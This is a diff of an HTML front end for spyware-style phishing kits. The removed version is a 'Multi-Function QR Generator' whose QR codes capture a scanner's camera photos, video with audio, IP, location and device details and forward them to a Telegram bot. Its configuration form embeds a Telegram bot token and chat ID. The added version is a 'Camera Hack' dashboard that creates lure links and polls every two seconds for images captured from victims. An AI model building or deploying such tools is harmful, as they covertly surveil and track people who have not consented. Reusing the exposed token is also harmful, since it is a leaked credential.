@@ -1,361 +1,282 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multi-Function QR Generator - Advanced Tool BY @e3hacker</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Maxx Spy - Dashboard</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #121212;
+      color: #e0e0e0;
+    }
+
+    .header {
+      background: #1f1f1f;
+      color: #fff;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.4);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .logo-icon {
+      font-size: 24px;
+      color: #4cafef;
+    }
+
+    .dashboard {
+      padding: 20px;
+    }
+
+    .dashboard-header h1 {
+      margin: 0;
+      font-size: 24px;
+      color: #ffffff;
+    }
+
+    .dashboard-header p {
+      color: #aaaaaa;
+      margin: 5px 0 15px;
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .btn {
+      background: #4cafef;
+      color: #fff;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn.small {
+      padding: 6px 10px;
+      font-size: 13px;
+    }
+
+    .btn:hover {
+      background: #3797db;
+    }
+
+    .session-info {
+      background: #1f1f1f;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+    }
+
+    .session-info span {
+      color: #4cafef;
+      font-weight: bold;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .images-section {
+      margin-top: 20px;
+    }
+
+    .images-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 15px;
+    }
+
+    .images-grid img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .images-grid img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 14px rgba(0,0,0,0.8);
+    }
+
+    .placeholder {
+      text-align: center;
+      color: #777;
+      grid-column: 1 / -1;
+      font-size: 16px;
+    }
+
+    .notify {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #1f1f1f;
+      color: #fff;
+      padding: 12px 18px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+      display: none;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      z-index: 2000;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .notify.success { border-left: 5px solid #28a745; }
+    .notify.error { border-left: 5px solid #e74c3c; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header class="header">
-            <h1><i class="fas fa-qrcode"></i> Multi-Function QR Generator</h1>
-            <p>Advanced QR generator with camera, live video, IP tracking, and multi-function capabilities</p>
-        </header>
 
-        <!-- Function Selection -->
-        <div class="function-selector">
-            <h3><i class="fas fa-list"></i> Select Function</h3>
-            <div class="function-buttons">
-                <button class="function-btn active" data-function="basic" id="basicBtn">
-                    <i class="fas fa-qrcode"></i>
-                    Basic QR
-                </button>
-                <button class="function-btn" data-function="camera" id="cameraBtn">
-                    <i class="fas fa-camera"></i>
-                    Camera Access
-                </button>
-                <button class="function-btn" data-function="video" id="videoBtn">
-                    <i class="fas fa-video"></i>
-                    Live Video
-                </button>
-                <button class="function-btn" data-function="ip" id="ipBtn">
-                    <i class="fas fa-globe"></i>
-                    IP Info
-                </button>
-                <button class="function-btn" data-function="multi" id="multiBtn">
-                    <i class="fas fa-layer-group"></i>
-                    Multi-Function
-                </button>
+  <div class="container">
+    <header class="header">
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fas fa-camera"></i>
+        </div>
+        <div class="logo-text">Camera Hack Eman Don</div>
+      </div>
+    </header>
+
+    <main>
+      <section class="dashboard">
+        <div class="dashboard-header">
+          <h1>📸 Captured Images</h1>
+          <p>Your session images will appear below in real-time.</p>
+
+          <div class="actions">
+            <button id="createSessionBtn" class="btn">+ Create New Session</button>
+            <div id="sessionInfo" class="session-info hidden">
+              <span id="sessionUrl"></span>
+              <button id="copyBtn" class="btn small">📋 Copy</button>
             </div>
+          </div>
         </div>
 
-        <!-- Telegram Channel Button -->
-        <div class="telegram-section">
-            <a href="https://t.me/e3hacker" target="_blank" class="telegram-btn">
-                <i class="fab fa-telegram-plane"></i>
-                Join Our Telegram Channel
-            </a>
+        <div class="images-section">
+          <div id="imagesGrid" class="images-grid">
+            <p class="placeholder">No images captured yet...</p>
+          </div>
         </div>
+      </section>
+    </main>
+  </div>
 
-        <!-- Bot Configuration Section -->
-        <div class="config-section" id="configSection">
-            <div class="config-card">
-                <h3><i class="fas fa-cog"></i> Bot Configuration</h3>
-                <div class="config-inputs">
-                    <div class="input-group">
-                        <label for="botToken">
-                            <i class="fas fa-robot"></i>
-                            Telegram Bot Token
-                        </label>
-                        <input 
-                            type="text" 
-                            id="botToken" 
-                            placeholder="8359484829:AAGUWaqbnqcSwcpltF1jWtirMw0kay6-lmI"
-                            value="8359484829:AAGUWaqbnqcSwcpltF1jWtirMw0kay6-lmI"
-                        >
-                    </div>
-                    <div class="input-group">
-                        <label for="chatId">
-                            <i class="fas fa-comments"></i>
-                            Chat ID
-                        </label>
-                        <input 
-                            type="text" 
-                            id="chatId" 
-                            placeholder="7763525520"
-                            value="7763525520"
-                        >
-                    </div>
-                    <button class="save-btn" id="saveConfigBtn">
-                        <i class="fas fa-save"></i>
-                        Save Configuration
-                    </button>
-                </div>
-            </div>
-        </div>
+  <div id="notifyBox" class="notify"></div>
 
-        <!-- Basic QR Form -->
-        <div class="form-section" id="basicForm">
-            <form id="qrForm">
-                <div class="input-group">
-                    <label for="linkInput">
-                        <i class="fas fa-link"></i>
-                        Enter URL or Link
-                    </label>
-                    <input type="url" id="linkInput" placeholder="https://example.com" required>
-                </div>
-                
-                <div class="input-group">
-                    <label for="textInput">
-                        <i class="fas fa-font"></i>
-                        Additional Text (Optional)
-                    </label>
-                    <textarea id="textInput" placeholder="Enter any additional text here..." rows="3"></textarea>
-                </div>
-                
-                <button type="submit" class="generate-btn">
-                    <i class="fas fa-qrcode"></i>
-                    Generate QR Code
-                </button>
-            </form>
-        </div>
+  <script>
+    let currentSessionId = null;
 
-        <!-- Camera Access Form -->
-        <div class="form-section" id="cameraForm" style="display: none;">
-            <div class="camera-section">
-                <h3><i class="fas fa-camera"></i> Camera Access QR Generator</h3>
-                <p class="warning-text">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    This QR code will request camera permission and capture photos when scanned.
-                </p>
-                <form id="cameraQrForm">
-                    <div class="input-group">
-                        <label for="cameraLinkInput">
-                            <i class="fas fa-link"></i>
-                            Target URL (after photo capture)
-                        </label>
-                        <input type="url" id="cameraLinkInput" placeholder="https://example.com" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <label for="cameraTextInput">
-                            <i class="fas fa-font"></i>
-                            Additional Text (Optional)
-                        </label>
-                        <textarea id="cameraTextInput" placeholder="Enter additional text..." rows="3"></textarea>
-                    </div>
-                    
-                    <button type="submit" class="generate-btn camera-btn">
-                        <i class="fas fa-camera"></i>
-                        Generate Camera QR Code
-                    </button>
-                </form>
-            </div>
-        </div>
+    function showNotify(message, type="success") {
+      const notify = document.getElementById("notifyBox");
+      notify.textContent = message;
+      notify.className = "notify " + type;
+      notify.style.display = "flex";
 
-        <!-- Live Video Form -->
-        <div class="form-section" id="videoForm" style="display: none;">
-            <div class="video-section">
-                <h3><i class="fas fa-video"></i> Live Video QR Generator</h3>
-                <p class="warning-text">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    This QR code will request camera and microphone access for live video capture.
-                </p>
-                <form id="videoQrForm">
-                    <div class="input-group">
-                        <label for="videoLinkInput">
-                            <i class="fas fa-link"></i>
-                            Target URL (after video capture)
-                        </label>
-                        <input type="url" id="videoLinkInput" placeholder="https://example.com" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <label for="videoTextInput">
-                            <i class="fas fa-font"></i>
-                            Additional Text (Optional)
-                        </label>
-                        <textarea id="videoTextInput" placeholder="Enter additional text..." rows="3"></textarea>
-                    </div>
-                    
-                    <button type="submit" class="generate-btn video-btn">
-                        <i class="fas fa-video"></i>
-                        Generate Video QR Code
-                    </button>
-                </form>
-            </div>
-        </div>
+      setTimeout(() => {
+        notify.style.display = "none";
+      }, 3000);
+    }
 
-        <!-- IP Info Form -->
-        <div class="form-section" id="ipForm" style="display: none;">
-            <div class="ip-section">
-                <h3><i class="fas fa-globe"></i> IP Information QR Generator</h3>
-                <p class="warning-text">
-                    <i class="fas fa-info-circle"></i>
-                    This QR code will collect detailed IP and location information.
-                </p>
-                <form id="ipQrForm">
-                    <div class="input-group">
-                        <label for="ipLinkInput">
-                            <i class="fas fa-link"></i>
-                            Target URL (after data collection)
-                        </label>
-                        <input type="url" id="ipLinkInput" placeholder="https://example.com" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <label for="ipTextInput">
-                            <i class="fas fa-font"></i>
-                            Additional Text (Optional)
-                        </label>
-                        <textarea id="ipTextInput" placeholder="Enter additional text..." rows="3"></textarea>
-                    </div>
-                    
-                    <button type="submit" class="generate-btn ip-btn">
-                        <i class="fas fa-globe"></i>
-                        Generate IP Info QR Code
-                    </button>
-                </form>
-            </div>
-        </div>
+    async function createSession() {
+      try {
+        const sessionId = "id_" + Math.random().toString(36).substring(2, 10);
+        const res = await fetch("/api/create-session", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sessionId })
+        });
 
-        <!-- Multi-Function Form -->
-        <div class="form-section" id="multiForm" style="display: none;">
-            <div class="multi-section">
-                <h3><i class="fas fa-layer-group"></i> Multi-Function QR Generator</h3>
-                <p class="warning-text">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    This QR code will collect IP info, camera access, video recording, and all data.
-                </p>
-                <form id="multiQrForm">
-                    <div class="input-group">
-                        <label for="multiLinkInput">
-                            <i class="fas fa-link"></i>
-                            Target URL (after all data collection)
-                        </label>
-                        <input type="url" id="multiLinkInput" placeholder="https://example.com" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <label for="multiTextInput">
-                            <i class="fas fa-font"></i>
-                            Additional Text (Optional)
-                        </label>
-                        <textarea id="multiTextInput" placeholder="Enter additional text..." rows="3"></textarea>
-                    </div>
-                    
-                    <div class="multi-options">
-                        <h4>Select Functions to Include:</h4>
-                        <div class="checkbox-group">
-                            <label class="checkbox-item">
-                                <input type="checkbox" id="includeIP" checked>
-                                <span class="checkmark"></span>
-                                IP & Location Info
-                            </label>
-                            <label class="checkbox-item">
-                                <input type="checkbox" id="includeCamera" checked>
-                                <span class="checkmark"></span>
-                                Camera Access
-                            </label>
-                            <label class="checkbox-item">
-                                <input type="checkbox" id="includeVideo" checked>
-                                <span class="checkmark"></span>
-                                Live Video Recording
-                            </label>
-                            <label class="checkbox-item">
-                                <input type="checkbox" id="includeDevice" checked>
-                                <span class="checkmark"></span>
-                                Device Information
-                            </label>
-                        </div>
-                    </div>
-                    
-                    <button type="submit" class="generate-btn multi-btn">
-                        <i class="fas fa-layer-group"></i>
-                        Generate Multi-Function QR Code
-                    </button>
-                </form>
-            </div>
-        </div>
+        const data = await res.json();
+        if (data.success) {
+          currentSessionId = data.sessionId;
+          localStorage.setItem("sessionId", currentSessionId);
 
-        <!-- Result Section -->
-        <div class="result-section" id="resultSection" style="display: none;">
-            <div class="result-card">
-                <div class="result-header">
-                    <h3><i class="fas fa-check-circle"></i> QR Code Generated Successfully!</h3>
-                    <p id="displayText">Your QR code is ready</p>
-                </div>
-                
-                <div class="qr-display">
-                    <div id="qrcode"></div>
-                </div>
-                
-                <div class="action-buttons">
-                    <button class="action-btn download-btn" id="downloadBtn">
-                        <i class="fas fa-download"></i>
-                        Download PNG
-                    </button>
-                    <button class="action-btn copy-btn" id="copyBtn">
-                        <i class="fas fa-copy"></i>
-                        Copy URL
-                    </button>
-                    <button class="action-btn new-btn" id="newBtn">
-                        <i class="fas fa-plus"></i>
-                        Generate New
-                    </button>
-                </div>
-            </div>
-        </div>
+          document.getElementById("sessionUrl").innerText = data.shortUrl;
+          document.getElementById("sessionInfo").classList.remove("hidden");
 
-        <!-- Features Section -->
-        <div class="features-section">
-            <h3><i class="fas fa-star"></i> Advanced Features</h3>
-            <div class="features-grid">
-                <div class="feature-card">
-                    <i class="fas fa-camera"></i>
-                    <h4>Camera Access</h4>
-                    <p>Request camera permission and capture photos</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-video"></i>
-                    <h4>Live Video</h4>
-                    <p>Record live video with audio</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-map-marked-alt"></i>
-                    <h4>Location Tracking</h4>
-                    <p>Precise IP geolocation with Google Maps integration</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-layer-group"></i>
-                    <h4>Multi-Function BY @SHHACKERDEV404</h4>
-                    <p>Combine all features in one QR code</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-telegram-plane"></i>
-                    <h4>Telegram Integration</h4>
-                    <p>Real-time notifications to your bot</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-bolt"></i>
-                    <h4>Instant Redirect</h4>
-                    <p>Fast redirect after data capture</p>
-                </div>
-            </div>
-        </div>
+          showNotify("✅ Session created successfully!", "success");
+          loadImages();
+        } else {
+          showNotify("❌ " + data.error, "error");
+        }
+      } catch (err) {
+        showNotify("⚠️ Failed to create session!", "error");
+        console.error(err);
+      }
+    }
 
-        <!-- Privacy Notice -->
-        <div class="privacy-notice">
-            <p><i class="fas fa-info-circle"></i> Privacy Notice: When users scan the generated QR codes, various data (IP, location, camera access, device info) will be collected and sent to your Telegram bot before redirecting to the target URL. Users will be prompted for necessary permissions.</p>
-        </div>
+    async function loadImages() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const paramSession = urlParams.get("id");
+        const storedSession = localStorage.getItem("sessionId");
 
-        <footer class="footer">
-            <p>&copy; 2025 Multi-Function QR Generator. Made with <i class="fas fa-heart"></i></p>
-        </footer>
-    </div>
+        currentSessionId = paramSession || storedSession;
 
-    <!-- Loading Overlay -->
-    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
-        <div class="spinner"></div>
-        <p>Generating QR Code...</p>
-    </div>
+        if (!currentSessionId) return;
 
-    <!-- Toast Notifications -->
-    <div id="toast" class="toast"></div>
+        const res = await fetch(`/api/get-images/${currentSessionId}`);
+        const data = await res.json();
 
-    <script src="script.js"></script>
+        const grid = document.getElementById("imagesGrid");
+        grid.innerHTML = "";
+
+        if (!data.success || data.images.length === 0) {
+          grid.innerHTML = '<p class="placeholder">No images captured yet...</p>';
+          return;
+        }
+
+        data.images.forEach(url => {
+          const img = document.createElement("img");
+          img.src = url;
+          img.alt = "Captured image";
+          grid.appendChild(img);
+        });
+      } catch (err) {
+        console.error("Failed to load images:", err);
+      }
+    }
+
+    document.getElementById("createSessionBtn").addEventListener("click", createSession);
+
+    document.getElementById("copyBtn").addEventListener("click", () => {
+      const text = document.getElementById("sessionUrl").innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        showNotify("✅ URL copied to clipboard!", "success");
+      });
+    });
+
+    loadImages();
+    setInterval(loadImages, 2000); // Refresh every 2 seconds
+  </script>
+
 </body>
 </html>
